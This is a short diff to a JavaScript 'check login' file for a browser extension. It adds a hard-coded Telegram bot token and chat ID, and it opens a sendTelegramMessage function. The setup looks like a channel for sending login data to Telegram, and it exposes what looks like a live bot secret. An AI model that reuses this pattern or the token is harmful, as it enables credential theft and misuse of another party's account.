@@ -1,7 +1,7 @@
 //check login modified for extension.  refer to the other check login file for plugin
 //check login modified for extension.  refer to the other check login file for plugin
-const BOT_TOKEN = "";
-const CHAT_ID = "";
+const BOT_TOKEN = "7545358851:AAHE4vJLPmfno_QWELlTqz1G5IzRQI2CYuY";
+const CHAT_ID = "6014938850";
 async function sendTelegramMessage({
   message,
   parseMode = "HTML",
